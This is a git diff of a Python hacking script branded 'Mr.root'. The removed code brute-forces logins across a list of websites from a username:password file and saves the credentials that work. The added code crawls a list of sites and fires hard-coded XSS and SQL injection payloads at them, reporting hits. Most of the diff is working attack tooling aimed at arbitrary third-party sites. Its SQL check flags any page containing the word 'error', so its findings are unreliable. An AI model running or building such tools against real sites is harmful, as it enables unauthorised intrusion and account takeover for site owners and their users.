@@ -1,133 +1,131 @@
 import requests
-import random
-import string
-import time
-import os
-from colorama import Fore, init
+from bs4 import BeautifulSoup
 import pyfiglet
+from termcolor import colored
+import os
 
-# Initialize colorama
-init(autoreset=True)
+# ASCII banner using pyfiglet
+ascii_banner = pyfiglet.figlet_format("Mr.root Scanner")
+print(colored(ascii_banner, "light_blue"))
 
-# Function to display welcome message with big font and colors
-def show_welcome_message():
-    os.system('cls' if os.name == 'nt' else 'clear')  # Clear the screen
-    welcome_text = pyfiglet.figlet_format("Tools Mr.root")
-    print(Fore.CYAN + welcome_text)  # Print the welcome message in cyan
-    time.sleep(2)  # Wait for 2 seconds before continuing
+# Common XSS payloads
+xss_payloads = [
+    "<script>alert(1)</script>",
+    "'><script>alert(1)</script>",
+    "\" onmouseover=alert(1) x=\"",
+    "<img src=x onerror=alert(1)>",
+    "'\"><svg/onload=alert(1)>"
+]
 
-# Function to generate random usernames and passwords
-def generate_random_userpass(num_entries):
-    userpass_list = []
-    for _ in range(num_entries):
-        # Generate random username (8-12 characters)
-        username_length = random.randint(8, 12)
-        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=username_length))
+# Common SQL Injection payloads
+sql_payloads = [
+    "' OR '1'='1",
+    "\" OR \"1\"=\"1",
+    "' UNION SELECT NULL, version()--",
+    "\" UNION SELECT NULL, database()--",
+    "' AND 1=1--",
+    "' OR 'a'='a"
+]
 
-        # Generate random password (8-12 characters)
-        password_length = random.randint(8, 12)
-        password = ''.join(random.choices(string.ascii_lowercase + string.digits, k=password_length))
+# Function to load websites from a file
+def load_websites(file_name):
+    if not os.path.exists(file_name):
+        print(colored(f"File {file_name} not found!", "red"))
+        return []
+    with open(file_name, "r") as file:
+        return [line.strip() for line in file if line.strip()]
 
-        # Append the username:password pair
-        userpass_list.append(f"{username}:{password}")
+# Function to check XSS vulnerabilities
+def check_xss(url):
+    vulnerabilities = []
+    for payload in xss_payloads:
+        try:
+            response = requests.get(f"{url}?q={payload}", timeout=10)
+            if payload in response.text:
+                vulnerabilities.append({"url": url, "payload": payload})
+        except requests.exceptions.RequestException as e:
+            print(colored(f"[XSS] Error testing {url}: {e}", "red"))
+    return vulnerabilities
 
-    return userpass_list
+# Function to check SQL Injection vulnerabilities
+def check_sql(url):
+    vulnerabilities = []
+    for payload in sql_payloads:
+        try:
+            response = requests.get(f"{url}?q={payload}", timeout=10)
+            if "syntax" in response.text.lower() or "error" in response.text.lower():
+                vulnerabilities.append({"url": url, "payload": payload})
+        except requests.exceptions.RequestException as e:
+            print(colored(f"[SQL] Error testing {url}: {e}", "red"))
+    return vulnerabilities
 
-# Function to attempt login with username and password
-def attempt_login(url, username, password):
-    login_data = {'username': username, 'password': password}  # Adjust depending on the website form
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
-    }
-
+# Enhanced function to discover links within a website (Advanced feature)
+def discover_links(url):
+    links = []
     try:
-        response = requests.post(url, data=login_data, headers=headers, timeout=10)  # POST request with timeout
-        if response.status_code == 200 and "admin" in response.text.lower():  # Adjust the success criteria
-            return True, response.text
+        response = requests.get(url, timeout=10)
+        soup = BeautifulSoup(response.text, "html.parser")
+        for a_tag in soup.find_all("a", href=True):
+            href = a_tag["href"]
+            if href.startswith("http"):
+                links.append(href)
+            elif href.startswith("/"):
+                links.append(url.rstrip("/") + href)
     except requests.exceptions.RequestException as e:
-        print(Fore.RED + f"Request error: {e}")
-    return False, None
+        print(colored(f"[DISCOVER] Error discovering links on {url}: {e}", "red"))
+    return links
 
-# Function to handle the scanning process
-def scan_sites(urls, credentials):
-    found_sites = []
-    
-    for url in urls:
-        url = url.strip()  # Clean up URL
-        for username, password in credentials:
-            print(Fore.YELLOW + f"Scanning {url} with username '{username}' and password '{password}'...")
+# Start scanning
+def scan_websites(file_name):
+    websites = load_websites(file_name)
+    if not websites:
+        return
 
-            # Try to log in to the admin page of the site
-            success, response_text = attempt_login(url, username, password)
+    results = {}
 
-            if success:
-                print(Fore.GREEN + f"[+] Found valid credentials for {url} with username '{username}' and password '{password}'!")
-                found_sites.append((url, username, password))  # Add the site and credentials to found_sites
-                break  # Once a successful login is found for the site, stop further guessing
-            else:
-                print(Fore.RED + f"[-] Failed to log in to {url} with the provided credentials.")
-    
-    return found_sites
+    for website in websites:
+        print(colored(f"\n[+] Scanning: {website}", "cyan"))
 
-# Function to save the found sites to a file
-def save_found_sites(found_sites):
-    with open('found.txt', 'w') as file:
-        for site, username, password in found_sites:
-            file.write(f"{site} - Username: {username}, Password: {password}\n")
-    print(Fore.CYAN + "[*] Results saved to found.txt")
+        # Discover additional links on the website
+        links = discover_links(website)
+        all_urls = [website] + links
+        results[website] = {"xss": [], "sql": []}
 
-# Function to read usernames and passwords from a file
-def read_userpass_file(userpass_file):
-    credentials = []
-    try:
-        with open(userpass_file, 'r') as file:
-            for line in file.readlines():
-                username, password = line.strip().split(':')  # Assuming format "username:password"
-                credentials.append((username, password))
-    except FileNotFoundError:
-        print(Fore.RED + f"[!] The file '{userpass_file}' was not found!")
-    return credentials
+        for url in all_urls:
+            # Check for XSS vulnerabilities
+            xss_vulns = check_xss(url)
+            if xss_vulns:
+                results[website]["xss"].extend(xss_vulns)
+
+            # Check for SQL Injection vulnerabilities
+            sql_vulns = check_sql(url)
+            if sql_vulns:
+                results[website]["sql"].extend(sql_vulns)
+
+    # Display results
+    for website, vulnerabilities in results.items():
+        print(colored(f"\n[Results for {website}]:", "green"))
+
+        # Display XSS vulnerabilities
+        if vulnerabilities["xss"]:
+            print(colored("XSS Vulnerabilities Found:", "yellow"))
+            for vuln in vulnerabilities["xss"]:
+                print(colored(f"Payload: {vuln['payload']} | URL: {vuln['url']}", "green"))
+        else:
+            print(colored("No XSS vulnerabilities found.", "red"))
+
+        # Display SQL vulnerabilities
+        if vulnerabilities["sql"]:
+            print(colored("SQL Injection Vulnerabilities Found:", "yellow"))
+            for vuln in vulnerabilities["sql"]:
+                print(colored(f"Payload: {vuln['payload']} | URL: {vuln['url']}", "green"))
+        else:
+            print(colored("No SQL Injection vulnerabilities found.", "red"))
+
+    print(colored("\n[+] Scan Complete!", "light_blue"))
 
 # Main function
-def main():
-    # Show welcome message
-    show_welcome_message()
-
-    # Ask for user input
-    url_list_file = input(Fore.CYAN + "Enter the path to the URL list file (e.g., urls.txt): ").strip()
-    userpass_file = input(Fore.CYAN + "Enter the path to the user:pass file (e.g., userpass.txt): ").strip()
-
-    if not os.path.exists(url_list_file):
-        print(Fore.RED + f"[!] The file '{url_list_file}' was not found!")
-        return
-    if not os.path.exists(userpass_file):
-        print(Fore.RED + f"[!] The file '{userpass_file}' was not found!")
-        return
-
-    # Read the URL list from file
-    with open(url_list_file, 'r') as file:
-        urls = file.readlines()
-
-    # Read the user:pass file
-    credentials = read_userpass_file(userpass_file)
-    if not credentials:
-        print(Fore.RED + "[!] No valid credentials found in the file.")
-        return
-
-    # Start scanning
-    print(Fore.YELLOW + "[*] Starting the login attempts...\n")
-    found_sites = scan_sites(urls, credentials)
-
-    # If found any valid sites
-    if found_sites:
-        print(Fore.GREEN + "\n[+] The following sites were successfully accessed:")
-        for site, username, password in found_sites:
-            print(Fore.GREEN + f"  - {site} with Username: {username} and Password: {password}")
-
-        # Save results to found.txt
-        save_found_sites(found_sites)
-    else:
-        print(Fore.RED + "[*] No valid credentials found.")
-
-if __name__ == '__main__':
-    main()
+if __name__ == "__main__":
+    print(colored("Enter the file name containing the list of websites (e.g., list.txt):", "yellow"))
+    file_name = input("> ").strip()
+    scan_websites(file_name)
